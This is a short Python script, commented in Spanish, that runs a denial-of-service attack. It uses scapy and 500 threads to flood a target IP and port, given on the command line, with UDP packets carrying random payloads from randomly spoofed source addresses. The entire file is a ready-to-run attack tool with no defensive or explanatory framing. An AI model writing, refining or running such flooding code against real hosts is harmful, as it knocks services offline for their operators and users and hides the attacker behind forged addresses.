import threading
import random
import time
import sys
from scapy.all import IP, UDP, Raw, send

# Número de hilos (ajusta según tu CPU)
THREADS = 500

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def udp_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    payload = random._urandom(1024)  # 1KB aleatorio

    while time.time() < timeout:
        ip_pkt = IP(src=random_ip(), dst=target_ip)
        udp_pkt = UDP(sport=random.randint(1024, 65535), dport=target_port)
        pkt = ip_pkt / udp_pkt / Raw(load=payload)
        send(pkt, verbose=0)

def start_attack(ip, port, duration):
    print(f"[+] Ataque iniciado a {ip}:{port} por {duration} segundos con {THREADS} hilos.")
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=udp_flood, args=(ip, port, duration))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
    print("[+] Ataque terminado.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Uso: python3 udp_spoof_fast.py <IP> <Puerto> <Tiempo>")
        sys.exit(1)

    try:
        target_ip = sys.argv[1]
        target_port = int(sys.argv[2])
        duration = int(sys.argv[3])
    except ValueError:
        print("Error: Puerto y Tiempo deben ser números enteros.")
        sys.exit(1)

    start_attack(target_ip, target_port, duration)
